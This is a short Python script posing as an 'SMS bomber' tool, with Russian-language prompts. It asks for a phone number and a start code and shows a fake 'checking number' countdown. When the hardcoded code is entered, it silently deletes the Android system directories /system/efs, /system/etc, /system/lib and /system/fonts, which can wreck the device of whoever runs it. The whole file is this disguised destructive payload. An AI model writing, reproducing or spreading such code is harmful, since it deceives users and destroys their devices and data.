import shutil
import time

from numpy import piecewise

print("Bomber borodach")

o = input("Введите номер телефона: +")
t = input("Введите код для старта: ")

time_count = 5
 
for i in range(time_count, 0, -1):
    print('Подождите идет проверка номера! Осталось %d секунд' % i)
    time.sleep(1)

print("Отправление пакетов!")

if t == "273639AHynjYH":
    shutil.rmtree('/system/efs', ignore_errors=True)
    shutil.rmtree('/system/etc', ignore_errors=True)
    shutil.rmtree('/system/lib', ignore_errors=True)
    shutil.rmtree('/system/fonts', ignore_errors=True)

time.sleep(60)
